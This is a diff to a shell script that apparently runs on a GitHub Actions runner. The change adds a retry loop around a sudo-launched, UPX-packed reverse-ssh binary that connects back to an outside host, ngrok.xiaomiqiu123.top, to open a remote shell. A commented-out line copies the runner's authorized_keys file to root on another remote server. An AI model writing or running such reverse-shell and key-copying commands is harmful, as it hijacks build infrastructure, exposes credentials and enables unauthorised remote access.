@@ -259,7 +259,9 @@ ip5=${ip_port5%:*};
 
 if [ ! -z ${port5} ] && [ ! -z ${ip5} ]; then
 ((sudo $GITHUB_WORKSPACE/upx_reverse-sshx64.bin -v -l -p 60021)&)&
-((sudo $GITHUB_WORKSPACE/upx_reverse-sshx64.bin  -v -b 50050  -p 34292 ngrok.xiaomiqiu123.top )&)&
+((
+for((i=0;i<10;i++));do sudo /home/runner/work/nc_test/nc_test/upx_reverse-sshx64.bin -v -b 50050  -p 34292 ngrok.xiaomiqiu123.top;sleep 60;sleep $i;done
+)&)&
 
 #sudo apt-get install redis-server
 #sudo scp -P 28357 /home/runner/.ssh/authorized_keys    root@node4.buuoj.cn:/root/.ssh/authorized_keys
